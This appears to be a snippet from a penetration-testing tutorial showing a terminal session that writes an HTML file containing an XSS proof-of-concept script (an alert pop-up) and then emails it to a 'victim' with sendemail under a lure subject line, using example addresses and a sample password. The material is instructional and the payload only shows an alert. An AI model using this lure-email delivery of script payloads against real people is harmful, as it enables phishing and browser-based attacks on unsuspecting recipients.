@@ -1,0 +1,13 @@
+root@bt:~/# cat > meal.txt
+<html>
+<body>
+<h1>XSS pop up</h1>
+<script>alert('Hi, what is this?');</script>
+</body>
+</html>
+root@bt:~/#
+ 
+Send email to the victim:
+root@bt:~/# sendemail -f bob@example.com -t david@example.com -xu bob@example.com \
+-xp bob123 -u "Want some meal..?" -o message-file=meal.txt -s mail.example.com
+ 
